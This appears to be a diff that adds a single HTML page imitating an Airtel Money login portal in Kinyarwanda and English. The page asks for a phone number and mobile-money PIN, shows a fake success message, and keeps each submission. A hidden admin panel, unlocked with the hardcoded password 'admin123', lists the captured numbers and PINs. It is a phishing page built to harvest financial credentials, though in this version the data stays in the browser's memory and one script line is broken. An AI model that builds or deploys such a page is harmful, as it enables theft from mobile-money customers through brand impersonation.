@@ -1,0 +1,508 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airtel Money - Portal</title>
+    <style>
+        /* CSS Reset and Global Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #660000; /* Deep maroon background */
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Background visual effects */
+        .bg-blur-effect {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 100vw;
+            height: 100vh;
+            background: 
+                radial-gradient(circle at 30% 30%, rgba(255, 255, 255, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 70% 70%, rgba(255, 0, 0, 0.2) 0%, transparent 50%);
+            filter: blur(50px);
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        /* App Container */
+        .app-container {
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            max-width: 400px;
+            height: 100%;
+            max-height: 850px;
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+            transition: opacity 0.3s ease;
+        }
+
+        /* Views Management */
+        .view {
+            display: none;
+            width: 100%;
+            height: 100%;
+            flex-direction: column;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .view.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* --- USER LOGIN VIEW --- */
+        .language-selector {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background-color: #fce4e4;
+            padding: 8px 16px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            user-select: none;
+            transition: all 0.2s ease;
+            z-index: 20;
+        }
+
+        .language-selector:hover { background-color: #ffffff; }
+        .language-selector svg { margin-left: 10px; width: 12px; height: 12px; fill: #333; transition: transform 0.3s ease; }
+        .language-selector.active svg { transform: rotate(180deg); }
+
+        .login-card {
+            background: rgba(140, 20, 20, 0.6);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border-radius: 20px;
+            padding: 40px 25px;
+            margin-top: 80px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: white;
+            width: 100%;
+        }
+
+        .brand-title { font-size: 28px; font-weight: 800; letter-spacing: 1px; margin-bottom: 20px; text-transform: uppercase; text-align: center; }
+        .subtitle { font-size: 18px; font-weight: 700; text-align: center; line-height: 1.4; margin-bottom: 15px; }
+        .instruction { font-size: 15px; font-weight: 400; margin-bottom: 25px; color: rgba(255, 255, 255, 0.9); }
+
+        .input-group { width: 100%; margin-bottom: 15px; }
+        .input-group input {
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            border: none;
+            outline: none;
+            font-size: 15px;
+            background-color: #ffffff;
+            color: #333;
+            transition: box-shadow 0.3s ease;
+        }
+        .input-group input::placeholder { color: #888; }
+        .input-group input:focus { box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.3); }
+
+        .btn-submit {
+            width: 100%;
+            padding: 16px;
+            margin-top: 10px;
+            border-radius: 12px;
+            border: none;
+            background-color: #e60000;
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: background-color 0.2s ease, transform 0.1s ease;
+            letter-spacing: 0.5px;
+        }
+        .btn-submit:hover { background-color: #cc0000; }
+        .btn-submit:active { transform: scale(0.98); }
+        .btn-submit:disabled { background-color: #990000; cursor: not-allowed; opacity: 0.7; }
+
+        .footer-text { margin-top: 25px; font-size: 12px; text-align: center; color: rgba(255, 255, 255, 0.7); line-height: 1.4; padding: 0 10px; }
+        
+        .admin-link {
+            margin-top: 15px;
+            font-size: 11px;
+            color: rgba(255,255,255,0.4);
+            text-decoration: underline;
+            cursor: pointer;
+            text-align: center;
+        }
+        .admin-link:hover { color: rgba(255,255,255,0.8); }
+
+        /* Success Overlay */
+        .success-overlay {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            z-index: 50;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+        .success-overlay.show { opacity: 1; pointer-events: auto; }
+        .success-icon { font-size: 50px; color: #4CAF50; margin-bottom: 15px; }
+
+        /* --- ADMIN VIEW --- */
+        .admin-card {
+            background: rgba(30, 30, 30, 0.95);
+            border-radius: 20px;
+            padding: 30px 25px;
+            margin-top: 40px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: white;
+            width: 100%;
+            height: 80vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .admin-title { font-size: 22px; font-weight: bold; margin-bottom: 20px; text-align: center; color: #e60000; }
+        
+        .admin-login-form { display: flex; flex-direction: column; gap: 15px; margin-top: 20px;}
+        .admin-input {
+            padding: 14px; border-radius: 8px; border: 1px solid #444; background: #222; color: white; font-size: 14px;
+        }
+        .admin-input:focus { outline: none; border-color: #e60000; }
+
+        .btn-admin-login {
+            padding: 14px; border-radius: 8px; border: none; background: #e60000; color: white; font-weight: bold; cursor: pointer;
+        }
+        .btn-admin-login:hover { background: #cc0000; }
+
+        /* Dashboard Table */
+        .dashboard-container {
+            display: none;
+            flex-direction: column;
+            flex-grow: 1;
+            overflow: hidden;
+        }
+        .dashboard-container.active { display: flex; }
+
+        .dashboard-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .btn-logout {
+            background: transparent; border: 1px solid #e60000; color: #e60000; padding: 5px 10px; border-radius: 5px; cursor: pointer; font-size: 12px;
+        }
+        .btn-logout:hover { background: #e60000; color: white; }
+
+        .table-wrapper {
+            flex-grow: 1;
+            overflow-y: auto;
+            border: 1px solid #333;
+            border-radius: 8px;
+            background: #1a1a1a;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 13px;
+            text-align: left;
+        }
+        th, td {
+            padding: 12px 10px;
+            border-bottom: 1px solid #333;
+        }
+        th {
+            background-color: #222;
+            color: #aaa;
+            position: sticky;
+            top: 0;
+            font-weight: 600;
+        }
+        tr:hover { background-color: #2a2a2a; }
+        .no-data { text-align: center; color: #666; padding: 20px; font-style: italic; }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .app-container { padding: 15px; }
+            .login-card { padding: 30px 20px; margin-top: 60px; }
+            .brand-title { font-size: 24px; }
+            .subtitle { font-size: 16px; }
+            .admin-card { padding: 20px 15px; margin-top: 20px; height: 90vh; }
+            th, td { padding: 8px 5px; font-size: 11px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg-blur-effect"></div>
+
+    <div class="app-container">
+        
+        <!-- ================= USER LOGIN VIEW ================= -->
+        <div id="userView" class="view active">
+            <div class="language-selector" id="langSelector">
+                <span id="currentLang">Ikinyarwanda</span>
+                <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+            </div>
+
+            <div class="login-card" style="position: relative;">
+                <h1 class="brand-title">AIRTEL MONEY</h1>
+                <p class="subtitle" id="subtitleText">Kwinjira kwa klient<br>n'amahitamo y'igiciro<br>cy'igishura</p>
+                <p class="instruction" id="instructionText">Gufungura igishura:</p>
+
+                <form id="loginForm" style="width: 100%;">
+                    <div class="input-group">
+                        <input type="tel" id="phoneNumber" placeholder="Numero ya Airtel Money" required>
+                    </div>
+                    <div class="input-group">
+                        <input type="password" id="pinCode" placeholder="Andika kode ya PIN" required>
+                    </div>
+                    <button type="submit" class="btn-submit" id="submitBtn">FUNGURA</button>
+                </form>
+
+                <p class="footer-text" id="footerText">Airtel Money iba hafi yawe buri gihe.</p>
+                <p class="admin-link" onclick="switchView('adminView')">Admin Access</p>
+
+                <!-- Success Overlay (Inside card to blur background) -->
+                <div class="success-overlay" id="successOverlay">
+                    <div class="success-icon">✓</div>
+                    <h3 id="successMsg">Login Successful!</h3>
+                </div>
+            </div>
+        </div>
+
+        <!-- ================= ADMIN PANEL VIEW ================= -->
+        <div id="adminView" class="view">
+            <div class="admin-card">
+                <h2 class="admin-title">Admin Control Panel</h2>
+                
+                <!-- Admin Login Form -->
+                <div class="admin-login-form" id="adminLoginForm">
+                    <p style="font-size: 13px; color: #aaa; text-align: center;">Enter admin password to view logs.</p>
+                    <input type="password" id="adminPassword" class="admin-input" placeholder="Password (Hint: admin123)">
+                    <button class="btn-admin-login" onclick="loginAdmin()">Login</button>
+                    <p class="admin-link" onclick="switchView('userView')" style="margin-top: 10px;">Return to User Login</p>
+                </div>
+
+                <!-- Admin Dashboard -->
+                <div class="dashboard-container" id="adminDashboard">
+                    <div class="dashboard-header">
+                        <h3>User Submissions</h3>
+                        <button class="btn-logout" onclick="logoutAdmin()">Logout</button>
+                    </div>
+                    <div class="table-wrapper">
+                        <table id="dataTable">
+                            <thead>
+                                <tr>
+                                    <th>Time</th>
+                                    <th>Phone Number</th>
+                                    <th>PIN</th>
+                                    <th>Language</th>
+                                </tr>
+                            </thead>
+                            <tbody id="tableBody">
+                                <!-- Data populated by JS -->
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- JavaScript Logic -->
+    <script>
+        // --- State Management ---
+        let usersData = []; // Array to store user submissions
+        let currentLangIndex = 0;
+
+        // Language Configuration
+        const languages = [
+            {
+                code: 'rw',
+                name: 'Ikinyarwanda',
+                subtitle: 'Kwinjira kwa klient<br>n\'amahitamo y\'igiciro<br>cy\'igishura',
+                instruction: 'Gufungura igishura:',
+                phonePlaceholder: 'Numero ya Airtel Money',
+                pinPlaceholder: 'Andika kode ya PIN',
+                btnText: 'FUNGURA',
+                footer: 'Airtel Money iba hafi yawe buri gihe.'
+            },
+            {
+                code: 'en',
+                name: 'English',
+                subtitle: 'Client Login<br>with service<br>payment options',
+                instruction: 'Open account:',
+                phonePlaceholder: 'Airtel Money Number',
+                pinPlaceholder: 'Enter PIN code',
+                btnText: 'LOGIN',
+                footer: 'Airtel Money is always near you.'
+            }
+        ];
+
+        // --- DOM Elements ---
+        const langSelector = document.getElementById('langSelector');
+        const currentLangSpan = document.getElementById('currentLang');
+        const subtitleText = document.getElementById('subtitleText');
+        const instructionText = document.getElementById('instructionText');
+        const phoneInput = document.getElementById('phoneNumber');
+        const pinInput = document.getElementById('pinCode');
+        const submitBtn = document.getElementById('submitBtn');
+        const footerText = document.getElementById('footerText');
+        const loginForm = document.getElementById('loginForm');
+        const successOverlay = document.getElementById('successOverlay');
+        const successMsg = document.getElementById('successMsg');
+
+        // --- View Management ---
+        function switchView(viewId) {
+            // Hide all views
+            document.querySelectorAll('.view').forEach(view => view.classList.remove('active'));
+            // Show target view
+            document.getElementById(viewId).classList.add('active');
+            
+            // Reset admin dashboard state when switching back to user view
+            if(viewId === 'userView') {
+                document.getElementById('adminLoginForm').style.display = 'flex';
+                document.getElementById('adminDashboard').classList.remove('active');
+                document.getElementById('adminPassword').value = '';
+            }
+        }
+
+        // --- Language Toggle Logic ---
+        langSelector.addEventListener('click', () => {
+            langSelector.classList.add('active');
+            
+            // Cycle language
+            currentLangIndex = (currentLangIndex + 1) % languages.length;
+            const selectedLang = languages[currentLangIndex];
+            
+            // Update UI text dynamically
+            currentLangSpan.textContent = selectedLang.name;
+            subtitleText.innerHTML = selectedLang.subtitle;
+            instructionText.textContent = selectedLang.instruction;
+            phoneInput.placeholder = selectedLang.phonePlaceholder;
+            pinInput.placeholder = selectedLang.pinPlaceholder;
+            submitBtn.textContent = selectedLang.btnText;
+            footerText.textContent = selectedLang.footer;
+            successMsg.textContent = selectedLang.code === 'rw' ? 'Kwinjira byagenze neza!' : 'Login Successful!';
+
+            // Reset arrow
+            setTimeout(() => langSelector.classList.remove('active'), 300);
+        });
+
+        // --- User Form Submission ---
+        loginForm.addEventListener('submit', (e) => {
+            e.preventDefault(); // Prevent page reload
+            
+            const phone = phoneInput.value.trim();
+            const pin = pinInput.value.trim();
+            const lang = languages[currentLangIndex].name;
+
+            if (phone === '' || pin === '') return;
+
+            // 1. Simulate Loading State
+            const originalBtnText = submitBtn.textContent;
+            submitBtn.textContent = languages[currentLangIndex].code === 'rw' ? 'Gutegereza...' : 'Processing...';
+            submitBtn.disabled = true;
+
+            // 2. Simulate Network Request (1.5 seconds)
+            setTimeout(() => {
+                // Store data in our "database"
+                const timestamp = new Date().toLocaleTimeString();
+                usersData.push({ time: timestamp, phone: phone, pin: pin, lang: lang });
+                
+                // 3. Show Success Overlay
+                successOverlay.classList.add('show');
+
+                // 4. Reset form and button after 2 seconds
+                setTimeout(() => {
+                    successOverlay.classList.remove('show');
+                    submitBtn.textContent = originalBtnText;
+                    submitBtn.disabled = false;
+                    loginForm.reset();
+                }, 2000);
+
+            }, 1500);
+        });
+
+        // --- Admin Panel Logic ---
+        function loginAdmin() {
+            const password = document.getElementById('adminPassword').value;
+            
+            // Simple hardcoded authentication
+            if (password === 'admin123') {
+                document.getElementById('adminLoginForm').style.display = 'none';
+                document.getElementById('adminDashboard').classList.add('active');
+                renderAdminTable();
+            } else {
+                alert('Incorrect Password! (Hint: admin123)');
+            }
+        }
+
+        function logoutAdmin() {
+            switchView('userView');
+        }
+
+        function renderAdminTable() {
+            const tbody = document.getElementById('tableBody');
+            tbody.innerHTML = ''; // Clear existing rows
+
+            if (usersData.length === 0) {
+                tbody.innerHTML = <tr><td colspan="4" class="no-data">No user data submitted yet.</td></tr>;
+                return;
+            }
+
+            // Loop through data array and create table rows
+            usersData.forEach((user, index) => {
+                const tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td>${user.time}</td>
+                    <td>${user.phone}</td>
+                    <td style="color: #e60000; font-weight: bold;">${user.pin}</td>
+                    <td>${user.lang}</td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+    </script>
+</body>
+</html>
